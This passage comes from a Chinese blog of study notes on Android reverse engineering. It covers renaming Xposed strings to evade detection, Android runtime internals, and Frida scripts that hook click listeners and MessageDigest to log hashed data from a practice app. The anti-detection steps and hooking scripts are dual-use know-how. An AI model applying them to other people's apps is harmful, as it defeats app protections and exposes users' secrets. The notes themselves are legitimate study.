，是通过使用系统类加载器加载XposedHelper类，如果可以加载那么说明此系统中是有Xposed模块的。</p><p>（2）<code>寻找特征动态链接库</code>检测项，是通过查看<code>/proc/self/maps</code>文件，其中如果有XposedBridge字符串，那么说明此系统中有Xposed模块。</p><p>（3）<code>检测Xposed安装情况</code>检测项，是查看系统中已安装的App列表是否包含Xposed相关的App。</p><p>（4）<code>环境变量特征字判断</code>检测项，通过获得环境变量，查看环境变量中是否有XposedBridge。</p><p>&emsp;可以发现，大多数Xposed的特征都是字符串特征，所以可将Xposed检测字符串的点修改为其它字符串。步骤如下：</p><p>&emsp;(1) 修改XposedInstaller App的Xposed字符串特征，即修改整体包名以及prop配置文件相关字符串。根据书P144，可以修改所有<code>xposed</code>字符串变为<code>xppsed</code>，之后，修改配置文件与字符串硬编码的字符，例如<code>AndroidManifest.xml</code>，这里不再赘述，详见书P145左右。</p><p>&emsp;(2) 根据 (1) 的步骤修改XposedBridge，最终制作出XppsedBridge.jar。</p><p>&emsp;(3) 修改Xposed项目源代码，详见书P147。</p><p>&emsp;(4) 修改XposedTools工具的源码，保证编译过程中不报错。</p><p>&emsp;但是跟书修改完之后，始终无法检测到新编译的 xposed-v89-sdk25-arm64.zip，但是试了原代码编译的 xposed-v89-sdk25-arm64.zip，发现是可以检测到的。通过查看 xposedInstaller 源代码并调试，也未发现原因。为了不耽误时间，所以直接跳过此处的实验。耽误了两三周。</p><p>&emsp;本章最后还说明了基于自定义修改的 Xposed 框架编写 Xposed 模块的方式，见书 P150。本章大部分是 Xposed 魔改过检测，主要是针对字符串的检测，但是被 Xposed Hook 的函数，其 access_flags 属性变成了 native。</p><h3 id="相关知识补充"><a href="#相关知识补充" class="headerlink" title="相关知识补充"></a>相关知识补充</h3><p>&emsp;见<a href="https://bbs.kanxue.com/thread-269627.htm#msg_header_h2_1">link</a>。</p><p>&emsp;<code>Android 的平台架构如下所示：</code></p><p><img src="/images/frida-reverse-analysis-3/image-20240115194321408.png" alt="image-20240115194321408" style="zoom:67%;" /></p><p>（1）Linux 内核。Android 平台的基础是 linux 内核，Android Runtime（ART）依靠 Linux 内核来执行底层功能，基于linux 内核让 Android 更安全并且可以拥有很多设备驱动。</p><p>（2）硬件抽象层（HAL）。HAL 向更高级别 Java API 框架显示设备硬件功能，其中每个模块都为特定类型的硬件组件实现一个界面，例如相机和蓝牙模块，当框架 API 要访问设备硬件时，Android 系统为该硬件组件加载库模块。</p><p>（3）Android Runtime。Android 5.0 之前 Android Runtime 为 Dalvik，之后为 ART。Dalvik 是 JIT （运行前转为机器码），ART 是 AOT （运行时转为机器码）。 </p><p>（4）原生 C/C++ 库。许多核心 Android 系统组件和服务（例如 ART 和 HAL）需要以 C 和 C++ 编写的原生库。Android 平台提供 Java 框架 API 以向应用显示其中部分原生库的功能，我们可以通过 NDK 开发 Android 中的 C/C++ 库。</p><p>（5）Java API 框架。这些 API 形成创建 Android 应用所需的构建块。</p><p>&emsp;<code>一些文件类型：</code></p><div class="table-container"><table><thead><tr><th>文件类型</th><th>类型含义</th></tr></thead><tbody><tr><td>dex</td><td>Android 将所有的 class 文件打包形成一个 dex 文件，是 Dalvik 运行的程序。</td></tr><tr><td>odex</td><td>优化过的 dex 文件，apk 在安装时会进行验证和优化，通过 dexopt 生成 odex 文件，加快 apk 的响应时间。</td></tr><tr><td>oat</td><td>android 私有 ELF 文件格式，有 dex2oat 处理生成，包含（原 dex 文件<code>+</code>dex 翻译的本地机器指令），是 ART 虚拟机使用的文件，可以直接加载。</td></tr><tr><td>vdex</td><td>包含 APK 的未压缩 DEX 代码，以及一些旨在加快验证速度的元数据</td></tr></tbody></table></div><p>&emsp;<code>一些广泛的安卓版本：</code></p><div class="table-container"><table><thead><tr><th>版本号</th><th>特性</th></tr></thead><tbody><tr><td>Android 2.2</td><td>支持已转换成 dex 格式的 android 应用，基于寄存器，指令执行更快，加载的是 odex 文件，采用 JIT 运行时编译。但是由于是 JIT，每次启动应用都需要重新编译。</td></tr><tr><td>Android 4.4</td><td>ART 和 AOT。ART 和 Dalvik 是共存的，用户可以在两者之间选择。</td></tr><tr><td>Android 5.0</td><td>ART 取代 Dalvik。AOT是一种运行前编译的策略，缺点：（1）应用安装和系统升级之后的应用优化比较耗时；（2）优化后的文件会占用额外的存储空间。</td></tr><tr><td>Android 7.0</td><td>考虑上面 AOT 的缺点，dex2oat 过程比较耗时且会占用额外的存储空间，Android 7.0 再次加入 JIT 形成AOT+JIT+解释器模式。混合编译模式综合了 AOT 和 JIT 的各种优点，使得应用在安装速度加快的同时，运行速度、存储空间和耗电量等指标都得到了优化。应用在安装的时候 dex 不会被编译，应用在运行时 dex 文件先通过解析器（Interpreter）后会被直接执行，与此同时，热点函数（Hot Code）会被识别并被 JIT 编译后存储在 jit code cache 中并生成 profile 文件以记录热点函数的信息，手机进入 IDLE（空闲） 的时候，系统会扫描 App 目录下的 profile 文件并执行 AOT 过程进行编译。</td></tr></tbody></table></div><p>&emsp;Android 2.2 的 APP 运行图如下所示：</p><p><img src="/images/frida-reverse-analysis-3/image-20240115204417368.png" alt="image-20240115204417368" style="zoom:67%;" /></p><p>&emsp;Android 5.0 的 APP 运行图如下所示：</p><p><img src="/images/frida-reverse-analysis-3/image-20240115204957856.png" alt="image-20240115204957856" style="zoom:67%;" /></p><p>&emsp;<code>JIT 与 AOT 的区别：</code></p><p>&emsp;JIT 在每次运行程序的时候都需要对 odex 重新进行编译。AOT 是静态编译，应用在安装的时候会启动 dex2oat 过程把 dex 预编译成 ELF 文件，每次运行程序的时候不用重新编译。</p><p>&emsp;<code>JVM、Dalvik 和 ART 区别</code>：</p><p>&emsp;JVM：传统的 Java 虚拟机、基于栈、运行 class 文件。Dalvik，支持已转换成 dex 格式的 android 应用，基于寄存器，指令执行更快，加载的是 odex。ART，第一次安装时，将 dex 进行 Aot (预编译)，字节码预先编译成机器码，生成可执行 oat 文件（ELF文件）。</p><p>&emsp;<code>Android 各版本 ClassLoader 加载 dex 时的 dexopt 过程：</code></p><p><img src="/images/frida-reverse-analysis-3/image-20240115205940127.png" alt="image-20240115205940127" style="zoom:67%;" /></p><h2 id="0x06-Android沙箱之加解密库“自吐”"><a href="#0x06-Android沙箱之加解密库“自吐”" class="headerlink" title="0x06 Android沙箱之加解密库“自吐”"></a>0x06 Android沙箱之加解密库“自吐”</h2><p>&emsp;每个安卓应用都运行在独立的沙箱中，而本章介绍的沙箱指的是系统级的沙箱，即通过自定义系统源码编译特定系统，是得运行在自定义系统上的 App 行为都暴露在系统的监控下。</p><h3 id="自吐沙箱的建立"><a href="#自吐沙箱的建立" class="headerlink" title="自吐沙箱的建立"></a>自吐沙箱的建立</h3><p>&emsp;对于系统而言，App 的行为是没有隐私的。基于这种系统级沙箱从而监控 App 行为的思路，DexHunter、FART 等脱壳机从 ART 虚拟机层面对 App 进行内存数据的 dump，从而提出第一代、第二代（整体加固与函数加固）的解决方案。TinyTool 从内核中调用 JProbe（动态跟踪 Java 方法执行的工具，它是 Linux 内核提供的功能）来监控 syscall 系统调用，这样即使 App 应用使用静态编译的二进制文件，或者通过 svc 汇编指令在用户态直接进行系统调用，还可以打印出一份日志，来分析 App 的行为。</p><p>&emsp;除了基于系统源码的沙箱外，还有其它类型的沙箱，例如基于 Hook 类型的沙箱 r0capture，其虽然没有修改系统源码，但是基于 Hook 对系统收发包函数进行插桩，从而可以对应用层进行抓包。</p><p>&emsp;App 由于要依赖系统的 API，从而导致本身行为暴露在系统监控中。那么 App 如何抵抗沙箱分析？（1）App 尽可能少的减少系统 API 的调用；（2）关键函数的算法尽量不直接使用系统的加密库。</p><p>&emsp;本章基于 Hook 类型的沙箱，即 appmon，从而提出针对加密库进行分析的脚本，结合 Frida 开发自己的加密库沙箱。安卓提供了便利的加密封装库，我们可以直接通过 Hook 关键加密函数来进行逆向分析。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookEvent.js</span></span><br><span class="line"><span class="keyword">var</span> jclazz = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> jobj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getObjClassName</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!jclazz)&#123;</span><br><span class="line">        jclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!jobj)&#123;</span><br><span class="line">        jobj = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.<span class="property">getName</span>.<span class="title function_">call</span>(jobj.<span class="property">getClass</span>.<span class="title function_">call</span>(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">watch</span>(<span class="params">obj, mtdName</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> listener_name = <span class="title function_">getObjClassName</span>(obj);</span><br><span class="line">    <span class="keyword">var</span> target = <span class="title class_">Java</span>.<span class="title function_">use</span>(listener_name);</span><br><span class="line">    <span class="keyword">if</span>(!target || !mtdName <span class="keyword">in</span> target)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// overload onClick function</span></span><br><span class="line">    target[mtdName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[WatchEvent] &quot;</span> + mtdName + <span class="string">&quot;: &quot;</span> + <span class="title function_">getObjClassName</span>(<span class="variable language_">this</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>[mtdName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook View all onClick listener</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnClickListener</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// spawn 模式</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.View&quot;</span>).<span class="property">setOnClickListener</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">listener</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(listener != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="title function_">watch</span>(listener, <span class="string">&quot;onClick&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setOnClickListener</span>(listener);</span><br><span class="line">    &#125;;</span><br><span class="line">        <span class="comment">// attach 模式</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View$ListenerInfo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                instance = instance.<span class="property">mOnClickListener</span>.<span class="property">value</span>;</span><br><span class="line">                <span class="keyword">if</span>(instance)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mOnClickListener name is :&quot;</span> + <span class="title function_">getObjClassName</span>(instance));</span><br><span class="line">                    <span class="title function_">watch</span>(instance, <span class="string">&quot;onClick&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">OnClickListener</span>);</span><br></pre></td></tr></table></figure><p>&emsp;使用 frida，将 hookEvent.js 注入到 com.xiaojianbang.app，发现 JAVAMD5 按钮响应函数位于 com.xiaojianbang.app.MainActivity，之后使用 JADX 定位到 JAVAMD5 按钮的响应函数。JAVAMD5 使用了 java.security.MessageDigest 类中的函数，用于进行密码计算。主要包括 MessageDigest.getInstance()/update()/digest() 函数，由于每个函数可能存在多个重载，所以编写通用的可以 hook 任意函数所有重载的脚本（这里针对 MessageDigest.getInstance()），代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookMD5</span>(<span class="params">targetClassMethod</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(delim === -<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim);</span><br><span class="line">    <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">    <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++)&#123;</span><br><span class="line">    hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="comment">// this and arguments</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j],<span class="string">&#x27;=&gt;&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[j]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nretval: &quot;</span> + retval,<span class="string">&#x27;=&gt;&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(retval));</span><br><span class="line">            <span class="comment">// 打印调用栈</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            <span class="keyword">return</span> retval;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> targetClassMethod = <span class="string">&quot;java.security.MessageDigest.getInstance&quot;</span>;</span><br><span class="line">    <span class="title function_">hookMD5</span>(targetClassMethod);</span><br><span class="line">    targetClassMethod = <span class="string">&quot;java.security.MessageDigest.update&quot;</span>;</span><br><span class="line">    <span class="title function_">hookMD5</span>(targetClassMethod);</span><br><span class="line">    targetClassMethod = <span class="string">&quot;java.security.MessageDigest.digest&quot;</span>;</span><br><span class="line">    <span class="title function_">hookMD5</span>(targetClassMethod);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>&emsp;结果如下：</p><p><img src="/images/frida-reverse-analysis-3/image-20240116204627467.png" alt="image-20240116204627467" style="zoom:67%;" /></p><p>&emsp;<a href="https://github.com/dpnishant/appmon">Appmon 沙箱</a>是怎么做的呢？我们只关注功能本身，看针对 Hash 函数进行 trace 的脚本（appmon/scripts/Android/Crypto/Hash.js），注入后发现：</p><p><img src="/images/frida-reverse-analysis-3/image-20240116205248420.png" alt="image-20240116205248420" style="zoom:67%;" /></p><p>&emsp;其识别算法时，并未通过勾取 getInstance() 来获取算法信息，而是在勾取 digest 函数时通过 getAlgorithm 获得算法的种类，且 data 总为空。下面分析一下它的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hash.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格模式，对代码的解析和执行施加更严格的限制和规则</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 byteArraytoHexString，将 map 方法修改为如下</span></span><br><span class="line"><span class="keyword">var</span> byteArraytoHexString = <span class="keyword">function</span>(<span class="params">byteArray</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!byteArray)&#123;<span class="keyword">return</span> <span class="string">&#x27;11&#x27;</span>;&#125;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteArray.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    result += (<span class="string">&#x27;0&#x27;</span> + (byteArray[i] &amp; <span class="number">0xFF</span>).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">slice</span>(-<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> updateInput = <span class="keyword">function</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (input.<span class="property">length</span> &amp;&amp; input.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> normalized = <span class="title function_">byteArraytoHexString</span>(input);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (input.<span class="property">array</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> normalized = <span class="title function_">byteArraytoHexString</span>(input.<span class="title function_">array</span>());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> normalized = input.<span class="title function_">toString</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> normalized;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">MessageDigest</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.MessageDigest&quot;</span>);</span><br><span class="line">  <span class="comment">// 如果有 digest 函数</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">MessageDigest</span>.<span class="property">digest</span>)&#123;</span><br><span class="line">    <span class="title class_">MessageDigest</span>.<span class="property">digest</span>.<span class="property">overloads</span>[<span class="number">0</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> digest = <span class="variable language_">this</span>.<span class="property">digest</span>.<span class="property">overloads</span>[<span class="number">0</span>].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">       </span><br><span class="line">      <span class="comment">// 获取密码算法</span></span><br><span class="line">      <span class="keyword">var</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>().<span class="title function_">toString</span>();</span><br><span class="line">        </span><br><span class="line">      <span class="comment">// Payload 头</span></span><br><span class="line">      <span class="keyword">var</span> send_data = &#123;&#125;;</span><br><span class="line">      send_data.<span class="property">time</span> = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">      send_data.<span class="property">txnType</span> = <span class="string">&#x27;Crypto&#x27;</span>;</span><br><span class="line">      send_data.<span class="property">lib</span> = <span class="string">&#x27;java.security.MessageDigest&#x27;</span>;</span><br><span class="line">      send_data.<span class="property">method</span> = <span class="string">&#x27;digest&#x27;</span>;</span><br><span class="line">      send_data.<span class="property">artifact</span> = [];</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Payload 体</span></span><br><span class="line">      <span class="keyword">var</span> data = &#123;&#125;;</span><br><span class="line">      data.<span class="property">name</span> = <span class="string">&quot;Algorithm&quot;</span>;</span><br><span class="line">      data.<span class="property">value</span> = algorithm;</span><br><span class="line">      data.<span class="property">argSeq</span> = <span class="number">0</span>;</span><br><span class="line">      send_data.<span class="property">artifact</span>.<span class="title function_">push</span>(data);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Payload 体</span></span><br><span class="line">      <span class="keyword">var</span> data = &#123;&#125;;</span><br><span class="line">      data.<span class="property">name</span> = <span class="string">&quot;Digest&quot;</span>;</span><br><span class="line">      data.<span class="property">value</span> = <span class="title function_">byteArraytoHexString</span>(digest);</span><br><span class="line">      data.<span class="property">argSeq</span> = <span class="number">0</span>;</span><br><span class="line">      send_data.<span class="property">artifact</span>.<span class="title function_">push</span>(data);</span><br><span class="line"></span><br><span class="line">      <span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(send_data));</span><br><span class="line">      <span class="keyword">return</span> digest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">MessageDigest</span>.<span class="property">digest</span>.<span class="property">overloads</span>[<span class="number">1</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">input</span>) &#123;</span><br><span class="line">      <span class="comment">// same as above</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">MessageDigest</span>.<span class="property">update</span>) &#123;</span><br><span class="line">    <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span>[<span class="number">0</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">input</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> send_data = &#123;&#125;;</span><br><span class="line">      send_data.<span class="property">time</span> = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">      send_data.<span class="property">txnType</span> = <span class="string">&#x27;Crypto&#x27;</span>;</span><br><span class="line">      send_data.<span class="property">lib</span> = <span class="string">&#x27;java.security.MessageDigest&#x27;</span>;</span><br><span class="line">      send_data.<span class="property">method</span> = <span class="string">&#x27;update&#x27;</span>;</span><br><span class="line">      send_data.<span class="property">artifact</span> = [];</span><br><span class="line">      <span class="keyword">var</span> data = &#123;&#125;;</span><br><span class="line">      data.<span class="property">name</span> = <span class="string">&quot;Raw Data&quot;</span>;</span><br><span class="line">      data.<span class="property">value</span> = <span class="title function_">updateInput</span>(input);</span><br><span class="line">      data.<span class="property">argSeq</span> = <span class="number">0</span>;</span><br><span class="line">      send_data.<span class="property">artifact</span>.<span class="title function_">push</span>(data);</span><br><span class="line">      <span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(send_data));</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">update</span>.<span class="property">overloads</span>[<span class="number">0</span>].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span>[<span class="number">1</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">input, offset, len</span>) &#123;</span><br><span class="line">      <span class="comment">// same as above</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span>[<span class="number">2</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">input</span>) &#123;</span><br><span class="line">      <span class="comment">// same as above</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span>[<span class="number">3</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">input</span>) &#123;</span><br><span class="line">      <span class="comment">// same as above</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>&emsp;考虑到 hook 主要依赖于 Frida，Xposed 等工具，这类工具可能会由 app 